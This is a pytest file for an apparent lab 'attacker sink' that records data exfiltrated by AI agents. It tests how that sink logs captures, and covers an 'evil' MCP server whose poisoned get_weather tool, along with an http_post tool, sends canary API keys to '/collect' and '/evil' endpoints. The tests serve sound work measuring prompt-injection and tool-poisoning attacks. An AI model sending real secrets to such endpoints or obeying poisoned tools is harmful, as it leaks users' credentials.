"""The sink decides whether an attack worked, so its log has to be complete and tamper-proof."""

from pathlib import Path
from typing import Any

import httpx
import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from mcp.server.fastmcp import FastMCP
from mcp.shared.memory import create_connected_server_and_client_session

from lab.attacker_sink.server import MAX_BODY_BYTES, MAX_CAPTURES, create_app
from lab.fixtures.runs import create_run, load_canaries
from lab.mcp_servers import evil_server, http_server

SINK_PORT = 9999


@pytest.fixture
def app() -> FastAPI:
    return create_app()


@pytest.fixture
def client(app: FastAPI) -> TestClient:
    return TestClient(app)


def captured(client: TestClient) -> list[dict[str, Any]]:
    result: list[dict[str, Any]] = client.get("/captured").json()
    return result


async def captured_async(app: FastAPI) -> list[dict[str, Any]]:
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url="http://sink"
    ) as client:
        result: list[dict[str, Any]] = (await client.get("/captured")).json()
    return result


async def call(server: FastMCP, tool: str, **args: Any) -> None:
    async with create_connected_server_and_client_session(server) as session:
        result = await session.call_tool(tool, args)
    assert not result.isError


def test_log_starts_empty(client: TestClient) -> None:
    assert captured(client) == []


def test_post_body_is_recorded(client: TestClient) -> None:
    assert client.post("/collect", content="stolen data").status_code == 200
    [capture] = captured(client)
    assert capture["method"] == "POST"
    assert capture["path"] == "/collect"
    assert capture["body"] == "stolen data"


def test_a09_get_with_query_is_recorded(client: TestClient) -> None:
    client.get("/p?d=sk-canary-abc")
    [capture] = captured(client)
    assert capture["method"] == "GET"
    assert capture["path"] == "/p"
    assert capture["query"] == "d=sk-canary-abc"


@pytest.mark.parametrize("path", ["/", "/a/b/c", "/collect.php"])
def test_any_path_is_recorded(client: TestClient, path: str) -> None:
    client.post(path, content="x")
    assert captured(client)[0]["path"] == path


@pytest.mark.parametrize("method", ["PUT", "PATCH"])
def test_other_upload_methods_are_recorded(client: TestClient, method: str) -> None:
    client.request(method, "/x", content="data")
    assert captured(client)[0]["method"] == method


def test_captures_keep_their_order_and_have_ids(client: TestClient) -> None:
    client.post("/a", content="1")
    client.post("/b", content="2")
    entries = captured(client)
    assert [entry["path"] for entry in entries] == ["/a", "/b"]
    assert entries[0]["id"] != entries[1]["id"]
    assert entries[0]["ts"].endswith("Z")


def test_binary_body_does_not_break_the_log(client: TestClient) -> None:
    client.post("/x", content=b"\xff\xfe binary")
    assert "binary" in captured(client)[0]["body"]


def test_unicode_body_is_kept(client: TestClient) -> None:
    client.post("/x", content="नमस्ते".encode())
    assert captured(client)[0]["body"] == "नमस्ते"


def test_large_body_is_capped(client: TestClient) -> None:
    client.post("/x", content=b"a" * (MAX_BODY_BYTES + 100))
    assert len(captured(client)[0]["body"]) == MAX_BODY_BYTES


def test_log_size_is_bounded(client: TestClient) -> None:
    for number in range(MAX_CAPTURES + 5):
        client.post("/x", content=str(number))
    entries = captured(client)
    assert len(entries) == MAX_CAPTURES
    assert entries[-1]["body"] == str(MAX_CAPTURES + 4)


def test_delete_clears_the_log(client: TestClient) -> None:
    client.post("/x", content="1")
    assert client.delete("/captured").status_code == 200
    assert captured(client) == []


def test_posting_to_captured_cannot_clear_the_log(client: TestClient) -> None:
    """`http_post` can only POST, so a hijacked agent must not be able to wipe the evidence."""
    client.post("/x", content="evidence")
    client.post("/captured", content="clear")
    assert "evidence" in [entry["body"] for entry in captured(client)]


def test_reading_the_log_is_not_recorded(client: TestClient) -> None:
    client.get("/captured")
    assert captured(client) == []


def test_each_app_has_its_own_log() -> None:
    first, second = TestClient(create_app()), TestClient(create_app())
    first.post("/x", content="1")
    assert captured(second) == []


async def test_http_tool_delivers_a_real_canary_to_the_sink(app: FastAPI, tmp_path: Path) -> None:
    run = create_run(tmp_path, "run1", with_attacks=True)
    key = load_canaries(run).api_key
    server = http_server.build_server(SINK_PORT, httpx.ASGITransport(app=app))
    await call(server, "http_post", url="http://127.0.0.1:9999/collect", data=f"key={key}")
    [capture] = await captured_async(app)
    assert key in capture["body"]


async def test_evil_tool_delivers_a_real_canary_to_the_sink(app: FastAPI, tmp_path: Path) -> None:
    run = create_run(tmp_path, "run1", with_attacks=True)
    key = load_canaries(run).api_key
    transport = httpx.ASGITransport(app=app)
    server = evil_server.EvilServer(run, "poison", SINK_PORT, transport)
    await call(server, "get_weather", city="Paris", context=key)
    [capture] = await captured_async(app)
    assert capture["path"] == "/evil"
    assert key in capture["body"]


async def test_paired_runs_can_be_told_apart_by_canary(app: FastAPI, tmp_path: Path) -> None:
    first = load_canaries(create_run(tmp_path, "one", with_attacks=True)).api_key
    second = load_canaries(create_run(tmp_path, "two", with_attacks=True)).api_key
    server = http_server.build_server(SINK_PORT, httpx.ASGITransport(app=app))
    await call(server, "http_post", url="http://127.0.0.1:9999/collect", data=first)
    bodies = [entry["body"] for entry in await captured_async(app)]
    assert any(first in body for body in bodies)
    assert not any(second in body for body in bodies)
